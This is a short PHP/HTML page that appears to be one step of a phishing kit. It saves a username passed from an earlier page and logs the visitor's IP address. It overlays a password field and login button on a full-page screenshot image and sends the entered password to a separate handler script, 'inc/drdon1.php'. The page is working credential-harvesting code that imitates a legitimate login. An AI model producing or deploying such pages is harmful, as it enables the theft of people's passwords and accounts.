<?php
session_start();
$_SESSION['username'] = $_POST['username'];
$ip = getenv("REMOTE_ADDR");
?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<title>PersonalID Step</title>
<meta name="generator" content="WYSIWYG Web Builder 12 Trial Version - http://www.wysiwygwebbuilder.com">

</head>
<body>

<form name="dd" action="inc/drdon1.php" method="POST">
<div id="wb_Image1" style="position:absolute;left:0px;top:0px;width:1349px;height:614px;z-index:0;">
<img src="img/2.png" id="Image1" alt=""></div>
First name:<br>
<input type="password" name="pass" placeholder="Password" style="position:absolute;left:430px;top:238px;width:196px;height:25px;z-index:0;" required><br>
<input type="image" src="login.png" style="position:absolute;left:430px;top:325px;width:200px;height:50px;z-index:0;" alt="">
</form>



</body></html>